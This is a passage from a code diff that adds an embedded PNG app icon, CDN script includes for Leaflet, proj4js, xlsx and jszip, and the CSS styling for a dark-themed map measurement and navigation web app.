FcLgKd/AMjpUYabAABAQQoAABR0twAY/wNAbq9luQkAABR0swB4%2BgeANdzLdBMAACjo3ewDAPr7/Mu%2BW/3l05fGRwJE8dMEwPgfANZyK9u9AgCAghQAAChIAQCAgn4oAN7/A8CarjPeBAAAClIAAKAgBQAACvpWALz/B4C1XWa9CQAAFKQAAEBBCgAAFKQAAEBBb08nGwABoIpz5psAAEBBCgAAFKQAAEBBCgAAFKQAAEBBCgAAFPTWPwEEgFref/j41QQAAApSAACgIAUAAApSAACgIAUAAApSAACgIAUAAApSAACgIAUAAApSAACgIAUAAApSAACgIAUAAApSAACgIAUAAApSAACgIAUAAApSAACgoDfvP3z8OvsggDY%2B//Ku%2B894%2BfSl%2B88A%2BlMAIIkR4d6KkgDxKQAQTKagf5ZiAHEoADDRymG/lVIAcygAMJDAf0whgDEUAOhI4B%2BnEEAfCgA0JvT7UQagHQUAGhD64ykDcIwCADsJ/TiUAXieAgBPEPrxKQOwjQIADwj9vJQBuE8BgDsE/zoUAfiZAgBXBP%2B6FAH4TgGAk9CvSBmgOgWA0lYM/lvBtvdzXv9dVc4XVLDe3QwbZA2y2WG15ednO7fn4519bmG0XHcqHJQlnDKH0b1jj37uFQGqiX1HQiPRw6dC6GR5naAIUEXMOxAaiRoywiV%2BIVAEWF2sOw4aihQoQuSxqIXg8y/vfH8sKcYdBg1FCQ6hcczl%2BZv9nZoGsKIYKyU0MDskTicB0UuUMqAIsJL5KyYcNDv4hcFYEcqAIsAKFABSmxUAFv4YZpcB%2BwPITAEgJcHPtfN3M/raMA0gq7ezDwCeNSP8Xz59scAnMeu7mv0qCp7liiWN0QuswM9txusB0wAyMQEghZHh72l/PaO/U9MAMlAACG/UYir41zfyO1YCiM4VSlgjg59aRm0Y9EqAyEwACGlE%2BHviZ9Q1YBpARAoA4YwKfzhTAqjIFUkYgp%2BZRrwW8EqASEwACKF3%2BBv3s9WIa8U0gAgUAKbruRgKfvbqfe0oAcymADBV7/CHo5QAVuXqYwrBTyY99wfYF8AsJgAMJ/zJyjSAlSgADNVrkfOun1F6XmtKACMpAAzTM/xhNCWA7BQAhhD%2BQf3nb7OPIDUlgMwUALrrsZgZ%2BRNFr2tRCaA3BYCueoU/RKMEkI0CQDfCP7jz%2BN9rgGaUADJRAOii9aJl5E8WPa5VJYAeFACa6xH%2BkI0SQHQKAE0Jf/hOCSAyBYBmhH8i1%2B/97QPoRgkgKgWAJoQ/3KcEEJECwGEtFyOb/VhV62tbCeAoBYBDWoc/rE4JIAoFgN2EP%2ByjBBCBAsAuwj%2Bxexv%2BbAQcSglgNgWAqYQ/lbn%2BmUkB4GmtnjYsftDuPjAF4FkKAE8R/tCeEsAMCgCbCf8FPHrPbx/ANEoAoykAbCL8oT8lgJEUAIYR/vCY%2B4RRFAAe8jQB%2BbhveUQB4FVG/wvZ%2Bn7fPoDpvApghDfvP3z8OvsgiEn4r%2BXzP/%2B%2B%2Bc%2B%2B/PpHxyNhK/cgPZkA0JWFB/Zz/9CTAsBNLZ48LF5wXIv7yKsAblEA%2BInwh1iUAHpQAPiBRWJNz7z/3/PnycH9zSUFgOY8/UN77itaUwD4xugfYvMqgJYUAE6nk/CHLJQAWlEAYHF73%2BfbBwBrUwDw9A/JmALQggJQnPCHnJQAjlIAOET4wzzuP45QAArT/gHrQF0KALt5%2Bojv6EY%2BGwHjcx%2BylwJQ1NHWb9GBOI7ej6YANSkAAFCQAlCQp39YjykAz1IAihH%2BdbR6f28fQB5KAM9QAACgIAWgEE//sD5TALZSAACgIAWgCE//tbR%2Bb28fQC6mAGyhAABAQQpAAZ7%2BoR5TAB5RAHiV8Ie83L%2B8RgFYnBYP7GX9WJsCwF2eHnLqtWHPRsCc3MfcowAsTHsHjrKOrEsB4CZPDbAO9zO3KAAAUJACsKgjYztPC3n1fk9vH0BeR%2B5rrwHWpAAAQEEKwII8/QO3mAJwSQEAgIIUgMVo6UAv1pe1KAB8Y/yf26gNejYC5uY%2B50wBAICCFICF2PwHbGEzIKeTAgAAJSkAePpfwOj38vYB5Oe%2BRwFYhLEcMIr1Zg0KAAAUpAAUZwwIdbn/a1MAFmAcV9us9/H2AdRm3clPAQCAghSAwoz/AOtAXQpAcsZwwCzWn9wUAAAoSAEoythvDbM34s3%2B%2BbRhPahJAUjM%2BA2YzTqUlwIAAAUpAAUZ9wHXrAv1KACQVJT371GOA3iOApCU925AFNajnBQAAChIASjGez7gHutDLQoAABSkACTkfRvRNt5FOx7Gsy7lowAAQEEKQCHe7wGPWCfqUAAAoCAFAJKJ%2Br496nEBtykAydhoA0RlfcpFASjCez1gK%2BtFDQoAABSkAABAQQoAJBJ9o1304wO%2Bs2MDCvnv//zvwz/zj3//a8CRALMpAInYYcseW0L/3p9XBnjW51/e2USYhEQpwM1Yz7Ohv%2BXvUQZqefn0xUPH4uwBgCS2vl9vFf57/177ACAH9Q4W0Sv4b/0M0wDIzwQAFjAi/Gf%2BPKA9BQCSmxXGSgDkpgBAAvfeq88O4Xs/3z4AiE8BgKRmh/9ZlOMAnqMAQELRQjfa8QCPKQBJ%2BPe4QBbWqxwUgMX5JUDrifq0HfW42M/6sTYFAIK73FAXPWQvj89GQIhNAQCAghQAAChIAYAkoo//z7IcJ1Rnq%2Bb/W3XXaubPZQNS/vfon//599PLr3/MPozpMt%2BHe0X/zNYXEwAAKEkBgASyjdWzHS9UpAAAQEEKAAAUpABAUNk3AJ6t8jlgNQoAABSkAABAQQoAABSkAEBAq703X%2B3zwAoUAAAoSAGABP7x73/NPoSnZDteqEgBAICCFAAIZtX35at%2BLsjqzfsPH7/OPgge2/s/a/kfr/J5LSgz/I7918b//mfAfKw96zIBAICCFAAAKEgBgESi766PfnzAdwrA4va%2Bv2OOLRvloobsluOyETAX68faFIAkbKgBsrBe5aAAQELRpgDRjgd4TAGApKKEbpTjAJ6jAEAQe96Pzw7fPT/fPgCIQQGA5GaVgNnlAzhGAYAFjA5j4Q/5%2BTcesIhzKPf8dcGCH9ZhAgCL6RXSwh/W4j8DSuTIL%2BXw73Jj67kx7shEoGfo%2B4%2BBYrPerM8rgERePn3xm7l42mWIbykDnvQ5QvjnIU2gEOEOnNkDAAAFKQAwWdVfjFP1c0MUCgAAFKQAFGHzILCV9aIGBSAZO2yBqKxPuSgAMFH19%2BDVPz/MpAAAQEEKQCHe6wGPWCfqUAAAoCAFICEbbYBorEv5KAAwiQ1wf3EeYA4FoBjv94B7rA%2B1KAAAUJACkJT3bUAU1qOcFACYwHvvHzkfMJ4CUJD3fMA160I9CgAAFKTyJfby6YvWntTLr3/MPgRowvv/vEwAilIcgDPrQU0KAAAUpAAkZ/wGzGL9yU0BKMzYD7AO1KUAAEBBCsACjOGA0aw7%2BSkAxRn/QV3u/9oUAAAoSAFYhHEcMIr1Zg0KAMaAUJD7HgUAAApSABZyZCznaQDqOHK/G/%2BvQwEAgIIUAL4xBYD1uc85UwAWYzwH9GJ9WYsCAAAFKQALshkQuMXmPy4pAABQkAKwKFMA4JKnf64pAABQkALATaYAsA73M7coAAsztgOOso6sSwHgLk8NkJ/7mHsUgMVp78Be1o%2B1KQC8ytMD5OX%2B5TUKQAFHW7xFBPI5et96%2Bl%2BfAgAABSkARZgCQB2e/tlCAQCAghSAQkwBYH2e/tlKAQCAghSAYkwBYF2e/nmGAlCQEgDrEf48SwEAgIIUgKJMAWAdnv7ZQwFgNyUA5nMfspcCUJjWD1gH6lIAOMTTB8zj/uMIBaC4Fu3fIgTjtbjvPP3XpgCgBEAywp8WFAAAKEgB4HQ6mQJAFp7%2BaUUB4BslAGIT/rSkANCcEgDtua9oTQHgB54OYF3uby4pAPzEqwCIxeifHhQAblICIAbhTy8KAF0pAbCf%2B4ee3rz/8PHr7IMgrlYLkCeQufZ%2Bj763edx79GYCwKtaLR6eZGA74c8ICgAPWUQgH/ctjygADGMKAI%2B5TxhFAWATrwKgP6N/RlIA2EwJgH6EP6MpADxFCYD2hD8zKAA8TQmAdoQ/sygATKUEUJnrn5kUAHZp%2BbRhEaSilte9p3/2UADYTQmAfYQ/ESgAHKIEwHOEP1EoABzWugQoAqyo9bUt/DlKAaCJ1ouREsBKWl/Pwp8WFACaUQLgZ8KfqBQAmlIC4DvhT2QKAM0pASD8iU8BoIseJUARIIMe16rwpwcFgG56LFpKAJH1uD6FP70oAHSlBFCF8CcbBYDuepUARYAIel2Lwp/eFACG6LWYKQHM1Ov6E/6MoAAwjBLASoQ/2SkADNWzBCgCjNDzWhP%2BjKQAMFzPRU4JoKee15fwZzSrJVOcF7seC%2Br577Sg0orgZ0UmAExlGkB0wp9VKQBM17sEKALs0fvaEf7MpgAQQu/FUBFgqxHXivAnAisiYfTcF3BmfwD3jCiIrjsiMQEgnBGLpGkAl4Q/FSkAhDSqBCgCtY26BoQ/EVn9CGvEK4HLv98iXceo4ueaIjITAMIbtYiaCKxv5Hcs/IlOASCFkYupIrCe0d%2Bp8CcDqxxpjHolcHb5cyzo%2Bcwoca4TMjEBIJ0Zi6ypQB6zvivhTzZWNFIaPQ04s2EwrlkFzbVAVgoAqb18%2BjJl4fd6IIbZUxnfPZkpAKQ3axpwpgyMNTv0TyffM2uYfydBI7OLwPXPFhLtRAj908l3ylpi3FXQUIQicP3zBcfzZn9/l3x/rCjOHQaNzdofcMv1cQiUn0X5rq75rlhVzDsOGokyDbimEMT7Tq5V/E6oJfYdCI1ELQJnFQpB1HN/bcVzD7fkuCOhkehF4Oze8WUIp%2Bjn9p4M5xZaynmnwkFZisC1LcfbM8iyna8tBD9VvXn/4ePX2QcBs60YbLxO8FOdAgBXlIF1CX34TgGAOxSBdQh%2B%2BJkCAA8oAnkJfrhPAYAnKAPxCX3YRgGAnZSBOIQ%2BPE8BgAaUgfGEPhyjAEBjykA/Qh/aUQCgI2XgOKEPfSgAMJBC8JjAhzEUAJhIIRD4MIsCAMGsXAqEPcShAEASmYqBoIf4FABYyIiSINxhDQoAFLC3GAh7WNfb2QcAAIynAABAQQoAABSkAABAQQoAABSkAABAQQoAABSkAABAQQoAABSkAABAQQoAABSkAABAQQoAABSkAABAQQoAABSkAABAQQoAABT09s/ff3sz%2ByAAgHH%2B/P23NyYAAFCQAgAABSkAAFCQAgAABSkAAFCQAgAABb09nf765wCzDwQA6O%2Bc%2BSYAAFCQAgAABSkAAFCQAgAABX0rADYCAsDaLrPeBAAAClIAAKAgBQAACvqhANgHAABrus54EwAAKEgBAICCFAAAKOinAmAfAACs5Va2mwAAQEHvZh8A0N/Lpy%2BzDwEI5uYEwGsAAFjDvUz3CgAACrpbAEwBACC317LcBAAAClIAAKCgVwuA1wAAkNOjDDcBAICCHhYAUwAAyGVLdpsAAEBBmwqAKQAA5LA1s00AAKCgzQXAFAAAYnsmq00AAKCgpwqAKQAAxPRsRpsAAEBBTxcAUwAAiGVPNpsAAEBBuwqAKQAAxLA3k3dPAJQAAJjrSBZ7BQAABR0qAKYAADDH0Qw%2BPAFQAgBgrBbZ6xUAABTUpACYAgDAGK0yt9kEQAkAgL5aZm3TVwBKAAD00Tpj7QEAgIKaFwBTAABoq0e2dpkAKAEA0EavTO32CkAJAIBjemZp1z0ASgAA7NM7Q20CBICCuhcAUwAAeM6I7BwyAVACAGCbUZk57BWAEgAArxuZlUP3ACgBAHDb6IwcvglQCQCAH83Ixin/CkAJAIC/zMrEaf8MUAkAoLqZWTj19wAoAQBUNTsDwwTw%2Bw8fv84%2BBgDobXbwn4X5TYBRTggA9BIp68IUgNMp1okBgJaiZVyoAnA6xTtBAHBUxGwLd0CX7AsAILOIwX8WbgJwKfKJA4DXRM%2Bw0AXgdIp/AgHgWobsCn%2BAl7wSACCyDMF/Fn4CcCnTiQWglmwZlepgL5kGABBBtuA/SzUBuJT1hAOwjsxZlPbAL5kGADBS5uA/S/8BLikCAPS0QvCfLfNBLikCALS0UvCfLfeBLikCAByxYvCfLfvBLikCADxj5eA/W/4DXlIEAHhNheA/K/NBrykDAJxOtUL/UskPfUkRAKipavCflf7w15QBgLVVD/1LTsQrFAKA3AT%2BfU7MExQCgNgE/nZO1EFKAcAcwv4YJ68j5QDgGCHfz/8BPTtMj7i0vF4AAAAASUVORK5CYII%3D%22%2C%22sizes%22%3A%22512x512%22%2C%22type%22%3A%22image/png%22%2C%22purpose%22%3A%22any%20maskable%22%7D%5D%7D">
+
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/proj4js/2.11.0/proj4.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+
+<style>
+:root{
+  --bg:#0b1119; --bg2:#0e1621;
+  --panel:#101a26; --panel-2:#16222f; --card:#182634; --card-2:#1d2c3c;
+  --line:#243447; --line-2:#2e415a;
+  --ink:#e9f1f9; --muted:#8fa3b7;
+  --pri:#31c9e8; --pri-2:#5cd6ee; --pri-ink:#04222c;
+  --accent:#ffb020; --accent-ink:#211502;
+  --cyan:#38c0c9; --violet:#b58cff; --red:#ff5d5d; --green:#34d399;
+  --rbh:132px;
+  --mono:"SF Mono",ui-monospace,"Roboto Mono","Consolas",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  --shadow:0 12px 34px rgba(0,0,0,.45);
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;height:100%;font-family:var(--sans);color:var(--ink);background:var(--bg);overflow:hidden}
+#map{position:absolute;inset:0;z-index:0;background:#080d13}
+
+/* ---- crosshair + live readout ---- */
+#cross{position:absolute;left:50%;top:50%;z-index:400;transform:translate(-50%,-50%);pointer-events:none}
+#cross svg{display:block;filter:drop-shadow(0 0 3px rgba(0,0,0,.9))}
+#readout{
+  position:absolute;left:50%;bottom:calc(var(--panel-h,0px) + 14px);transform:translateX(-50%);z-index:500;
+  background:rgba(13,20,30,.88);border:1px solid var(--line);border-radius:12px;
+  padding:8px 14px;font-family:var(--mono);font-size:12px;line-height:1.55;white-space:nowrap;
+  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);max-width:94vw;overflow:hidden;text-overflow:ellipsis;
+  transition:bottom .2s ease;box-shadow:var(--shadow);
+}
+#readout .k{color:var(--muted);font-size:10px;letter-spacing:.6px}
+#readout .en{color:var(--accent);font-weight:700}
+
+/* ---- floating action buttons ---- */
+#fabs{position:absolute;right:14px;bottom:calc(var(--panel-h,0px) + 16px);z-index:600;display:flex;flex-direction:column;gap:12px;transition:bottom .2s ease}
+.fab{
+  width:52px;height:52px;border-radius:16px;border:1px solid var(--line-2);
+  background:rgba(22,34,47,.9);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+  color:var(--ink);font-size:21px;cursor:pointer;display:grid;place-items:center;box-shadow:var(--shadow);
+}
+.fab.primary{background:linear-gradient(160deg,#ffc14d,var(--accent));color:var(--accent-ink);border-color:#c98a12;font-size:24px}
+.fab:active{transform:scale(.92)}
+
+/* ---- ribbon ---- */
+#ribbon{position:absolute;top:0;left:0;right:0;z-index:1000;color:var(--ink);
+  background:linear-gradient(180deg,#131e2b,#0f1823 78%,#0d141e);
+  border-bottom:1px solid #060a10;box-shadow:0 6px 24px rgba(0,0,0,.45);font-size:12px;padding-top:env(safe-area-inset-top)}
+.rb-tabs{display:flex;align-items:center;gap:4px;padding:0 10px;height:38px;background:rgba(255,255,255,.02);border-bottom:1px solid #0a1119}
+.rb-brand{display:flex;align-items:center;gap:8px;font-weight:800;font-size:13.5px;margin-right:14px;letter-spacing:.2px}
+.rb-brand b{color:var(--pri)}
+.rb-logo{width:18px;height:18px;border:2px solid var(--pri);border-radius:50%;position:relative;flex:0 0 auto;box-shadow:0 0 10px rgba(49,201,232,.45)}
+.rb-logo::before,.rb-logo::after{content:"";position:absolute;background:var(--pri)}
+.rb-logo::before{left:50%;top:1px;bottom:1px;width:1.5px;transform:translateX(-50%)}
+.rb-logo::after{top:50%;left:1px;right:1px;height:1.5px;transform:translateY(-50%)}
+.rb-tab{padding:9px 14px;color:var(--muted);cursor:pointer;font-weight:600;white-space:nowrap;border-radius:9px 9px 0 0;position:relative}
+.rb-tab.active{color:var(--pri)}
+.rb-tab.active::after{content:"";position:absolute;left:12px;right:12px;bottom:0;height:2.5px;border-radius:3px;background:var(--pri);box-shadow:0 0 8px var(--pri)}
+.rb-tab:not(.active):hover{color:var(--ink)}
+.rb-body{display:flex;align-items:stretch;overflow-x:auto;-webkit-overflow-scrolling:touch;padding:8px 6px 9px;gap:2px}
+.rb-group{display:flex;flex-direction:column-reverse;justify-content:flex-end;gap:7px;padding:2px 14px;border-right:1px solid rgba(255,255,255,.05);min-width:max-content}
+.rb-group:last-child{border-right:0}
+.rb-label{color:#6d8092;font-size:10px;margin:0;white-space:nowrap;letter-spacing:.8px;text-transform:uppercase;font-weight:700;text-align:left}
+.rb-controls{display:flex;align-items:center;gap:8px;flex:1}
+.rb-mbtn{display:flex;align-items:center;gap:7px;background:var(--card);border:1px solid var(--line-2);color:var(--ink);border-radius:10px;padding:8px 13px;font:inherit;font-weight:600;font-size:12px;cursor:pointer;white-space:nowrap;transition:background .15s,border-color .15s}
+.rb-mbtn:hover{border-color:var(--pri)}
+.rb-mbtn.on{background:linear-gradient(160deg,var(--pri-2),var(--pri));border-color:var(--pri);color:var(--pri-ink);box-shadow:0 2px 12px rgba(49,201,232,.35)}
+.rb-mbtn .dot{width:8px;height:8px;border-radius:50%}
+.rb-mbtn.on .dot{background:var(--pri-ink)!important}
+.rb-gear{font-size:24px;color:var(--muted);cursor:pointer;line-height:1;user-select:none}
+.rb-gear:hover{color:var(--pri)}
+.rb-field{display:flex;flex-direction:column;gap:6px}
+.rb-field select{background:var(--card);border:1px solid var(--line-2);color:var(--ink);border-radius:9px;padding:7px 9px;font:inherit;font-size:12px;min-width:158px}
+.rb-field select:focus{outline:none;border-color:var(--pri)}
+.rb-degmin{display:flex;align-items:center;gap:4px}
+.rb-degmin input{width:48px;background:#0d1521;border:1px solid var(--line-2);color:#fff;border-radius:8px;padding:7px 4px;text-align:center;font-family:var(--mono);font-size:13px}
+.rb-degmin input:focus{outline:none;border-color:var(--pri)}
+.rb-degmin .u{color:var(--pri);font-size:13px;margin-right:7px;font-weight:800}
+.rb-zone,.rb-fmt{display:flex;gap:12px}
+.rb-fmt{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px 14px}
+.rb-zone label,.rb-fmt label{display:flex;align-items:center;gap:6px;cursor:pointer;color:#c6d3e0;font-size:12px;white-space:nowrap}
+.rb-zone input,.rb-fmt input{accent-color:var(--pri);margin:0}
+.exp-rb{gap:14px}
+.rb-run{background:linear-gradient(160deg,var(--pri-2),var(--pri));border:1px solid var(--pri);color:var(--pri-ink);font-weight:800;border-radius:10px;padding:11px 20px;cursor:pointer;font:inherit;font-size:13px;white-space:nowrap;box-shadow:0 3px 14px rgba(49,201,232,.35)}
+.rb-run:active,.rb-mbtn:active,.rb-tool:active{transform:scale(.96)}
+.rb-tool{background:var(--card);border:1px solid var(--line-2);color:var(--ink);border-radius:10px;padding:9px 12px;cursor:pointer;font:inherit;font-size:12px;font-weight:600;white-space:nowrap}
+.rb-tool:hover{border-color:var(--pri)}
+.rb-status{display:flex;align-items:center;gap:10px;padding:4px 12px 6px;font-size:11px;color:#7d92a6;border-top:1px solid rgba(255,255,255,.04);white-space:nowrap;overflow-x:auto}
+#rb-info{position:absolute;top:100%;right:8px;z-index:1200;background:var(--panel-2);border:1px solid var(--line-2);border-radius:12px;padding:13px 15px;max-width:360px;font-size:11.5px;color:#c6d3e0;box-shadow:var(--shadow);display:none;line-height:1.6}
+#rb-info.show{display:block}
+.leaflet-top{top:calc(var(--rbh) + env(safe-area-inset-top) + 4px)}
+
+/* ---- bottom / side panel ---- */
+#panel{
+  position:absolute;left:0;right:0;bottom:0;z-index:900;
+  background:rgba(16,26,38,.96);border-top:1px solid var(--line-2);border-radius:20px 20px 0 0;
+  box-shadow:0 -10px 40px rgba(0,0,0,.5);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  max-height:62vh;display:flex;flex-direction:column;transform:translateY(calc(100% - 46px));
+  transition:transform .28s cubic-bezier(.2,.7,.2,1);
+}
+#panel.open{transform:translateY(0)}
+#grip{height:46px;flex:0 0 46px;display:flex;align-items:center;justify-content:center;gap:10px;cursor:pointer;user-select:none;position:relative}
+#grip::before{content:"";position:absolute;top:8px;left:50%;transform:translateX(-50%);width:42px;height:4.5px;border-radius:3px;background:var(--line-2)}
+#grip .lbl{font-size:12px;color:var(--muted);font-weight:700;margin-top:8px}
+#grip .count{background:rgba(49,201,232,.12);border:1px solid rgba(49,201,232,.4);border-radius:20px;padding:2px 10px;font-family:var(--mono);font-size:11px;color:var(--pri);margin-top:8px}
+#panelbody{overflow-y:auto;padding:0 16px 20px;-webkit-overflow-scrolling:touch}
+
+.sec{border-top:1px solid rgba(255,255,255,.05);padding:15px 0}
+.sec:first-child{border-top:0}
+.sec h3{margin:0 0 11px;font-size:10.5px;letter-spacing:1.4px;text-transform:uppercase;color:var(--pri);font-weight:800}
+
+.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+label.fld{display:flex;flex-direction:column;gap:5px;font-size:11px;color:var(--muted);flex:1 1 140px}
+select,input[type=text]{
+  appearance:none;background:var(--card);border:1px solid var(--line-2);color:var(--ink);
+  border-radius:10px;padding:11px;font:inherit;font-size:13px;width:100%;
+}
+select:focus,input:focus{outline:none;border-color:var(--pri);box-shadow:0 0 0 3px rgba(49,201,232,.15)}
+input[type=text]{font-family:var(--mono)}
+
+.seg{display:flex;background:var(--card);border:1px solid var(--line-2);border-radius:10px;overflow:hidden;padding:3px;gap:3px}
+.seg button{flex:1;border:0;background:transparent;color:var(--muted);font:inherit;font-size:12px;font-weight:600;padding:8px;cursor:pointer;border-radius:7px}
+.seg button.on{background:var(--pri);color:var(--pri-ink)}
+
+.btn{
+  appearance:none;border:1px solid var(--line-2);background:var(--card-2);color:var(--ink);
+  border-radius:10px;padding:11px 13px;font:inherit;font-size:12px;font-weight:600;cursor:pointer;
+  display:inline-flex;align-items:center;gap:7px;justify-content:center;transition:border-color .15s;
+}
+.btn:hover{border-color:var(--pri)}
+.btn:active{transform:scale(.97)}
+.btn.ghost{background:transparent}
+.btn.danger{color:var(--red);border-color:#59303a}
+.btn.danger:hover{border-color:var(--red)}
+.btn.wide{flex:1}
+
+.list{display:flex;flex-direction:column;gap:7px}
+.item{display:flex;align-items:center;gap:10px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:9px 11px}
+.item:hover{border-color:var(--line-2)}
+.item .idx{width:26px;height:26px;border-radius:9px;background:linear-gradient(160deg,#ffc14d,var(--accent));color:var(--accent-ink);font-weight:800;font-size:12px;display:grid;place-items:center;flex:0 0 auto}
+.item .co{flex:1;min-width:0}
+.item .co .a{font-family:var(--mono);font-size:12px;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.item .co .b{font-family:var(--mono);font-size:11px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.item .x{border:0;background:transparent;color:var(--muted);font-size:17px;cursor:pointer;padding:3px 5px;flex:0 0 auto;border-radius:7px}
+.item .x:hover{color:var(--ink);background:rgba(255,255,255,.06)}
+.empty{color:var(--muted);font-size:12px;text-align:center;padding:16px 0}
+
+.result{display:flex;gap:10px;flex-wrap:wrap}
+.stat{flex:1 1 120px;background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--line-2);border-radius:14px;padding:12px 14px}
+.stat .v{font-family:var(--mono);font-size:19px;font-weight:800}
+.stat .u{font-size:11px;color:var(--muted);margin-top:3px}
+.stat.dist .v{color:var(--cyan)}
+.stat.area .v{color:var(--violet)}
+
+.hint{font-size:11px;color:var(--muted);margin-top:8px;line-height:1.55}
+.toast{
+  position:absolute;left:50%;top:calc(var(--rbh) + 10px);transform:translateX(-50%);z-index:2000;
+  background:var(--panel-2);border:1px solid var(--pri);border-radius:12px;padding:10px 18px;font-size:13px;
+  box-shadow:var(--shadow);opacity:0;pointer-events:none;transition:opacity .2s,top .2s;max-width:90vw;text-align:center;
+}
+.toast.show{opacity:1;top:calc(var(--rbh) + 18px)}
+
+/* ---- pick chips ---- */
+.pickrow{display:flex;flex-direction:column;gap:7px}
+.picklab{font-size:11px;color:var(--muted)}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.chip{border:1px solid var(--line-2);background:var(--card);color:var(--ink);border-radius:20px;padding:6px 13px;font-family:var(--mono);font-size:12px;font-weight:600;cursor:pointer}
+.chip:hover{border-color:var(--pri);color:var(--pri)}
+.chip:active{transform:scale(.95)}
+
+/* ---- navigation widget ---- */
+.gpschip{display:flex;align-items:center;gap:7px;background:var(--card);border:1px solid var(--line);border-radius:20px;padding:5px 10px;font-family:var(--mono);font-size:11px}
+.gpschip .led{width:9px;height:9px;border-radius:50%;background:var(--red);color:var(--red);box-shadow:0 0 7px currentColor}
+.gpschip.good .led{background:var(--green);color:var(--green)}
+.gpschip.mid .led{background:var(--accent);color:var(--accent)}
+#navArrow,#navRing{transition:transform .18s linear}
+#navWidget{position:absolute;z-index:1400;left:12px;top:calc(var(--rbh) + 12px);width:min(93vw,340px);background:rgba(13,20,30,.96);border:1px solid var(--line-2);border-radius:18px;box-shadow:var(--shadow);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);display:none;overflow:hidden}
+#navWidget.open{display:block}
+.nw-head{display:flex;align-items:center;gap:8px;padding:9px 11px;cursor:grab;user-select:none;border-bottom:1px solid rgba(255,255,255,.06);touch-action:none;background:rgba(255,255,255,.03)}
+.nw-head:active{cursor:grabbing}
+.nw-grip{color:var(--muted);font-size:13px;letter-spacing:-2px}
+.nw-title{font-size:12px;font-weight:700;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:40%}
+.nw-head .gpschip{margin-left:auto}
+.nw-btn{border:1px solid var(--line-2);background:var(--card);color:var(--ink);width:28px;height:28px;border-radius:9px;font-size:13px;cursor:pointer;display:grid;place-items:center;flex:0 0 auto}
+.nw-btn:hover{border-color:var(--pri)}
+.nw-btn.on{background:var(--pri);color:var(--pri-ink);border-color:var(--pri)}
+.nw-body{display:flex;gap:9px;padding:9px 11px;align-items:center}
+.nw-compass{flex:0 0 auto}
+.nw-compass svg{width:138px;height:138px;display:block}
+.nw-side{flex:1;min-width:0;display:flex;flex-direction:column;gap:5px}
+.nw-side .bearing-line{font-family:var(--mono);font-size:11px;text-align:left;margin:0 0 2px;line-height:1.35;color:var(--ink)}
+.nw-side .bearing-line b{color:var(--accent)}
+.nw-mini{display:flex;flex-direction:column;background:var(--card);border:1px solid var(--line);border-radius:9px;padding:5px 9px}
+.nw-mini .lab{font-size:9px;letter-spacing:.5px;color:var(--muted)}
+.nw-mini .val{font-family:var(--mono);font-size:11.5px;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.nw-settings{border-top:1px solid rgba(255,255,255,.06);padding:11px;display:flex;flex-direction:column;gap:10px}
+.dh-note{font-size:11px;color:var(--muted)}
+
+/* ---- help modal ---- */
+#helpModal{position:fixed;inset:0;z-index:3000;background:rgba(4,8,13,.62);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:18px}
+#helpModal.show{display:flex}
+.hm-card{width:min(600px,96vw);max-height:84vh;background:var(--panel-2);border:1px solid var(--line-2);border-radius:18px;box-shadow:var(--shadow);display:flex;flex-direction:column;overflow:hidden}
+.hm-head{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,.07);font-size:14px}
+.hm-body{overflow-y:auto;padding:6px 18px 18px;font-size:12.5px;line-height:1.65;color:#cdd9e5;-webkit-overflow-scrolling:touch}
+.hm-body h4{margin:16px 0 6px;font-size:12px;color:var(--pri);letter-spacing:.6px;text-transform:uppercase}
+.hm-body b{color:var(--ink)}
+.hm-body .tag{display:inline-block;background:var(--card);border:1px solid var(--line-2);border-radius:6px;padding:1px 7px;font-family:var(--mono);font-size:11px}
+
+/* ---- leaflet theming ---- */
+.leaflet-control-layers,.leaflet-bar a{background:var(--panel-2)!important;color:var(--ink)!important;border-color:var(--line-2)!important}
+.leaflet-control-layers-expanded{padding:10px 12px;color:var(--ink);border-radius:12px}
+.leaflet-control-layers label{color:var(--ink);font-size:13px}
+.leaflet-bar a{width:34px;line-height:34px;font-size:16px}
+.leaflet-control-attribution{background:rgba(11,17,25,.7)!important;color:var(--muted)!important}
+.leaflet-control-attribution a{color:var(--muted)!important}
+/* ---- on-map measurement labels ---- */
+.mlabel{background:rgba(13,20,30,.82);border:1px solid var(--line-2);color:#fff;font-family:var(--mono);font-size:11px;font-weight:600;padding:2px 6px;border-radius:6px;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.4);pointer-events:none;line-height:1.3}
+.mlabel.seg{color:#9ff0f6;border-color:#2b6b70}
+.mlabel.tot{color:#7fe3ea;border-color:#38c0c9;font-size:11.5px}
+.mlabel.area{color:#d9c4ff;border-color:#6a4fb0;text-align:center}
+.mlabel.imp{color:#a7f3c8;border-color:#2f7d55}
+.vtx-handle{background:transparent}
+.vtx-handle .vh{width:16px;height:16px;border-radius:50%;border:2px solid #0a0f14;box-sizing:border-box;box-shadow:0 0 0 1px rgba(255,255,255,.25)}
+.leaflet-marker-draggable{cursor:grab}
